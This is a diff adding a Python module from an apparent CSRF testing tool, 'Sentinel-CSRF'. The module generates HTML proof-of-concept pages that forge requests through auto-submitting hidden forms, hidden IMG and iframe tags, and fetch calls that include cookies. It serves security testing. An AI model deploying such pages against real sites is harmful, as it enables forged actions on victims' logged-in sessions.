@@ -1,0 +1,399 @@
+"""
+PoC (Proof of Concept) Generator for CSRF exploits.
+
+Generates standalone HTML files that demonstrate CSRF vulnerabilities.
+"""
+
+import json
+import html
+from dataclasses import dataclass
+from datetime import datetime, timezone
+from pathlib import Path
+from typing import Dict, List, Optional
+from urllib.parse import urlparse, parse_qs, unquote
+
+from sentinel_csrf.input.requests import HttpRequest
+from sentinel_csrf.analysis.browser import AttackVector
+
+
+@dataclass
+class PocConfig:
+    """Configuration for PoC generation."""
+    
+    auto_submit: bool = True
+    auto_submit_delay_ms: int = 100
+    show_form: bool = False
+    include_comments: bool = True
+    custom_title: Optional[str] = None
+
+
+class PocGenerator:
+    """
+    Generates HTML proof-of-concept files for CSRF exploits.
+    
+    Supports multiple attack vectors:
+    - Form POST (auto-submitting)
+    - Form GET 
+    - IMG tag (silent GET)
+    - Iframe (hidden GET)
+    - Fetch API
+    """
+    
+    @classmethod
+    def generate(
+        cls,
+        request: HttpRequest,
+        vector: AttackVector = AttackVector.FORM_POST,
+        config: Optional[PocConfig] = None,
+    ) -> str:
+        """
+        Generate HTML PoC for a given request.
+        
+        Args:
+            request: The HTTP request to generate PoC for
+            vector: Attack vector to use
+            config: PoC configuration options
+        
+        Returns:
+            Complete HTML document as string
+        """
+        config = config or PocConfig()
+        
+        if vector == AttackVector.FORM_POST:
+            return cls._generate_form_post(request, config)
+        elif vector == AttackVector.FORM_GET:
+            return cls._generate_form_get(request, config)
+        elif vector == AttackVector.IMG_TAG:
+            return cls._generate_img_tag(request, config)
+        elif vector == AttackVector.IFRAME:
+            return cls._generate_iframe(request, config)
+        elif vector in (AttackVector.FETCH_SIMPLE, AttackVector.FETCH_CORS):
+            return cls._generate_fetch(request, config)
+        else:
+            # Default to form-based
+            return cls._generate_form_post(request, config)
+    
+    @classmethod
+    def generate_from_finding(cls, finding_json: dict, config: Optional[PocConfig] = None) -> str:
+        """
+        Generate PoC from a finding JSON object.
+        """
+        config = config or PocConfig()
+        
+        # Extract request details from finding
+        method = finding_json.get("method", "POST")
+        url = finding_json.get("url", "")
+        endpoint = finding_json.get("endpoint", "/")
+        attack_vector = finding_json.get("attack_vector", "form_post")
+        
+        # Reconstruct basic request
+        parsed = urlparse(url)
+        request = HttpRequest(
+            method=method,
+            path=endpoint,
+            http_version="HTTP/1.1",
+            headers={"Host": parsed.netloc},
+            body="",
+        )
+        
+        # Map vector string to enum
+        vector_map = {
+            "form_post": AttackVector.FORM_POST,
+            "form_get": AttackVector.FORM_GET,
+            "img_tag": AttackVector.IMG_TAG,
+            "iframe": AttackVector.IFRAME,
+            "fetch_simple": AttackVector.FETCH_SIMPLE,
+        }
+        vector = vector_map.get(attack_vector, AttackVector.FORM_POST)
+        
+        return cls.generate(request, vector, config)
+    
+    @classmethod
+    def _generate_form_post(cls, request: HttpRequest, config: PocConfig) -> str:
+        """Generate form-based POST PoC."""
+        target_url = request.url
+        params = request.get_body_params()
+        
+        title = config.custom_title or f"CSRF PoC - {request.path}"
+        
+        # Build form inputs with URL-decoded values
+        # Decoding happens ONLY in PoC generation layer, not in detection/reporting
+        # Browser will re-encode on form submission
+        inputs_html = ""
+        for name, value in params.items():
+            # URL-decode the value for human-readable HTML (browser re-encodes on submit)
+            decoded_value = unquote(value)
+            escaped_name = html.escape(name)
+            escaped_value = html.escape(decoded_value)
+            inputs_html += f'    <input type="hidden" name="{escaped_name}" value="{escaped_value}">\n'
+        
+        # Add submit button if showing form
+        if config.show_form:
+            inputs_html += '    <input type="submit" value="Submit">\n'
+        
+        # Auto-submit script
+        auto_submit_script = ""
+        if config.auto_submit:
+            auto_submit_script = f"""
+  <script>
+    // Auto-submit after {config.auto_submit_delay_ms}ms
+    setTimeout(function() {{
+      document.getElementById('csrf-form').submit();
+    }}, {config.auto_submit_delay_ms});
+  </script>"""
+        
+        # Comments
+        comments = ""
+        if config.include_comments:
+            comments = f"""
+  <!--
+    CSRF Proof of Concept
+    Generated by Sentinel-CSRF v1.0.0
+    Target: {html.escape(target_url)}
+    Method: POST
+    Vector: Auto-submitting Form
+    Generated: {datetime.now(timezone.utc).isoformat()}
+  -->
+"""
+        
+        return f"""<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>{html.escape(title)}</title>
+  <style>
+    body {{
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      background: #f5f5f5;
+    }}
+    .container {{
+      text-align: center;
+      padding: 40px;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }}
+    h1 {{ color: #333; }}
+    .spinner {{
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #e74c3c;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }}
+    @keyframes spin {{
+      0% {{ transform: rotate(0deg); }}
+      100% {{ transform: rotate(360deg); }}
+    }}
+  </style>{comments}
+</head>
+<body>
+  <div class="container">
+    <h1>🔓 CSRF PoC</h1>
+    <p>Submitting request to target...</p>
+    <div class="spinner"></div>
+  </div>
+  
+  <form id="csrf-form" action="{html.escape(target_url)}" method="POST" style="display:none;">
+{inputs_html}  </form>
+{auto_submit_script}
+</body>
+</html>"""
+    
+    @classmethod
+    def _generate_form_get(cls, request: HttpRequest, config: PocConfig) -> str:
+        """Generate form-based GET PoC."""
+        target_url = request.url.split("?")[0]  # Base URL without query
+        params = request.get_query_params()
+        
+        title = config.custom_title or f"CSRF PoC - {request.path}"
+        
+        # Build form inputs from query params with URL-decoded values
+        # Multi-value parameters rendered as multiple input elements
+        inputs_html = ""
+        for name, values in params.items():
+            for value in values:
+                # URL-decode for human-readable HTML (browser re-encodes on submit)
+                decoded_value = unquote(value) if value else ""
+                escaped_name = html.escape(name)
+                escaped_value = html.escape(decoded_value)
+                inputs_html += f'    <input type="hidden" name="{escaped_name}" value="{escaped_value}">\n'
+        
+        auto_submit_script = ""
+        if config.auto_submit:
+            auto_submit_script = f"""
+  <script>
+    setTimeout(function() {{
+      document.getElementById('csrf-form').submit();
+    }}, {config.auto_submit_delay_ms});
+  </script>"""
+        
+        return f"""<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>{html.escape(title)}</title>
+</head>
+<body>
+  <h1>CSRF PoC - GET Request</h1>
+  <p>Redirecting to target...</p>
+  
+  <form id="csrf-form" action="{html.escape(target_url)}" method="GET">
+{inputs_html}  </form>
+{auto_submit_script}
+</body>
+</html>"""
+    
+    @classmethod
+    def _generate_img_tag(cls, request: HttpRequest, config: PocConfig) -> str:
+        """Generate IMG tag PoC (silent GET)."""
+        target_url = request.url
+        title = config.custom_title or f"CSRF PoC - {request.path}"
+        
+        return f"""<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>{html.escape(title)}</title>
+</head>
+<body>
+  <h1>CSRF PoC - IMG Tag</h1>
+  <p>Request sent silently via IMG tag.</p>
+  
+  <!-- Silent CSRF via IMG tag -->
+  <img src="{html.escape(target_url)}" style="display:none;" 
+       onerror="console.log('Request sent (error expected)')"
+       onload="console.log('Request sent successfully')">
+  
+  <script>
+    console.log('[CSRF PoC] Request triggered via IMG tag');
+  </script>
+</body>
+</html>"""
+    
+    @classmethod
+    def _generate_iframe(cls, request: HttpRequest, config: PocConfig) -> str:
+        """Generate hidden iframe PoC."""
+        target_url = request.url
+        title = config.custom_title or f"CSRF PoC - {request.path}"
+        
+        return f"""<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>{html.escape(title)}</title>
+</head>
+<body>
+  <h1>CSRF PoC - Hidden Iframe</h1>
+  <p>Request sent via hidden iframe.</p>
+  
+  <!-- Silent CSRF via hidden iframe -->
+  <iframe src="{html.escape(target_url)}" 
+          style="width:0;height:0;border:0;display:none;"
+          sandbox="allow-scripts allow-forms">
+  </iframe>
+  
+  <script>
+    console.log('[CSRF PoC] Request triggered via iframe');
+  </script>
+</body>
+</html>"""
+    
+    @classmethod
+    def _generate_fetch(cls, request: HttpRequest, config: PocConfig) -> str:
+        """Generate fetch API PoC."""
+        target_url = request.url
+        method = request.method.upper()
+        body = request.body
+        content_type = request.content_type or "application/x-www-form-urlencoded"
+        title = config.custom_title or f"CSRF PoC - {request.path}"
+        
+        # Escape body for JavaScript
+        js_body = json.dumps(body)
+        
+        return f"""<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>{html.escape(title)}</title>
+</head>
+<body>
+  <h1>CSRF PoC - Fetch API</h1>
+  <p id="status">Sending request...</p>
+  
+  <script>
+    // CSRF via Fetch API
+    fetch("{html.escape(target_url)}", {{
+      method: "{method}",
+      credentials: "include",  // Include cookies
+      headers: {{
+        "Content-Type": "{html.escape(content_type)}"
+      }},
+      body: {js_body}
+    }})
+    .then(response => {{
+      document.getElementById('status').textContent = 
+        'Response: ' + response.status + ' ' + response.statusText;
+      console.log('[CSRF PoC] Fetch completed:', response.status);
+    }})
+    .catch(error => {{
+      document.getElementById('status').textContent = 
+        'Request sent (CORS may block reading response)';
+      console.log('[CSRF PoC] Fetch error (expected with CORS):', error);
+    }});
+  </script>
+</body>
+</html>"""
+    
+    @classmethod
+    def save(cls, poc_html: str, output_path: Path) -> None:
+        """Save PoC to file."""
+        output_path.parent.mkdir(parents=True, exist_ok=True)
+        output_path.write_text(poc_html)
+
+
+def generate_poc(
+    request: HttpRequest,
+    vector: AttackVector = AttackVector.FORM_POST,
+    config: Optional[PocConfig] = None,
+) -> str:
+    """
+    Convenience function to generate a PoC.
+    
+    This is the main entry point for PoC generation.
+    """
+    return PocGenerator.generate(request, vector, config)
+
+
+def generate_poc_from_request_file(
+    request_path: Path,
+    output_path: Path,
+    vector: AttackVector = AttackVector.FORM_POST,
+) -> None:
+    """
+    Generate PoC from a raw HTTP request file.
+    """
+    from sentinel_csrf.input.requests import HttpRequestParser
+    
+    request = HttpRequestParser.parse_file(request_path)
+    poc_html = generate_poc(request, vector)
+    PocGenerator.save(poc_html, output_path)
+
+
+def generate_poc_from_finding_file(
+    finding_path: Path,
+    output_path: Path,
+) -> None:
+    """
+    Generate PoC from a finding JSON file.
+    """
+    finding_data = json.loads(finding_path.read_text())
+    poc_html = PocGenerator.generate_from_finding(finding_data)
+    PocGenerator.save(poc_html, output_path)
